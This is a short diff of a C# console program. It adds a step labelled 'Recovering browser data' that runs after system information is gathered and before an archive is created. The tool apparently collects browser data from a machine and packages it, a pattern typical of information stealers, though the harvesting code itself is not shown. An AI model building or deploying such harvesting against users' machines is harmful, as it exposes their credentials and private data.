@@ -21,6 +21,17 @@ class Program
         string sysInfo = SystemInfo.GetAll();
         Console.WriteLine("OK");
 
+        Console.Write("[*] Recovering browser data... ");
+        try
+        {
+            ConsoleApp1.BrowserRecovery.Execute(zipPath);
+            Console.WriteLine("OK");
+        }
+        catch (Exception ex)
+        {
+            Console.WriteLine($"FAILED: {ex.Message}");
+        }
+
         Console.Write("[*] Creating archive... ");
         try
         {
